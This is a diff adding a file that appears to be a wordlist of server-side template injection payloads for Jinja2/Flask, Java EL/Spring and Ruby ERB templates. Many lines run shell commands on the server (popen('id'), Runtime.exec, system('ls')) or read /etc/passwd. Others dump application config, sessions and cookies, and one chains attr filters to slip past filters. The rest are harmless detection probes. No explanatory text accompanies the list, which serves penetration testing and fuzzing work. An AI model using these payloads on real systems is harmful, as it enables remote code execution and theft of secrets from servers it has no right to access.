@@ -1,0 +1,94 @@
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{7*7}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{config.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read()}}
+${7*7}
+<%= system("id") %>
+${7*7}
+#{7*7}
+${{7*7}}
+${java.lang.Runtime.getRuntime().exec('id')}
+${session.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}
+#{session.setAttribute('test',request.getParameter('cmd'))}
+${request.getParameter('cmd')}
+{{config}}
+{{request}}
+{{self.__init__.__globals__.__builtins__}}
+{{ url_for.__globals__['current_app'].config }}
+{{ get_flashed_messages.__globals__.__builtins__ }}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()[200].__init__.__globals__}}
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}
+{{request.application.__self__._get_data_for_json.__builtins__['__import__']('os').popen('id').read()}}
+{{''.__class__.__bases__[0].__subclasses__()[500].__init__.__globals__['os'].popen('id').read()}}
+{{''|attr('__class__')|attr('__bases__')|attr('__getitem__')(0)|attr('__subclasses__')()|attr('__getitem__')(259)|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+{{request.environ.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{url_for.__globals__['os'].popen('id').read()}}
+{{g.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{session.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{namespace.__init__.__globals__['os'].popen('id').read()}}
+{{lipsum.__globals__.os.popen('cat /etc/passwd').read()}}
+{{range.__init__.__globals__.os.popen('id').read()}}
+{{dict.__init__.__globals__.__builtins__}}
+{{config.__class__.__init__.__globals__.__builtins__.open('/etc/passwd').read()}}
+{{request.__class__.__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()')}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
+${request.getClass().getMethod('getRequest').invoke(request).getParameter('cmd')}
+${session.setAttribute('test',session)}
+#{3*3}
+$%7B7*7%7D
+{{7*'7'}}
+{{config.items()}}
+{{request.cookies}}
+{{self._TemplateReference__context.cycler}}
+{{app.__builtins__}}
+{{get_flashed_messages.__globals__.os}}
+{{''.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__.os.popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[401].__init__.__globals__.os.popen('id').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[150].__init__.__globals__.__builtins__['__import__']('os').popen('cat /etc/passwd').read()}}
+<%25%3Dsystem('id')%25>
+${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
+$simple.available
+$simple.region
+${empty}
+${null}
+${true}
+${false}
+${pageContext}
+${pageContext.request.contextPath}
+${pageContext.session}
+${pageContext.servletContext}
+${applicationScope}
+${sessionScope}
+${requestScope}
+${param}
+${paramValues}
+${header}
+${cookie}
+${initParam}
+${pageScope}
+${not empty param}
+${empty param}
+${'test' instanceof String}
+${'test'.matches('.*')}
+${'test'.replace('t','T')}
+${'test'.substring(0,2)}
+${'test'.toUpperCase()}
+${'test'.length()}
+<%= 'test'.object_id %>
+<%= system('ls') %>
+<%= Dir.entries('/') %>
+<%= File.read('/etc/passwd') %>
+<%= IO.popen('id').read() %>
+<%= `id` %>
+<%= request.inspect %>
+<%= env.inspect %>
+<%= params.inspect %>
+<%= session.inspect %>
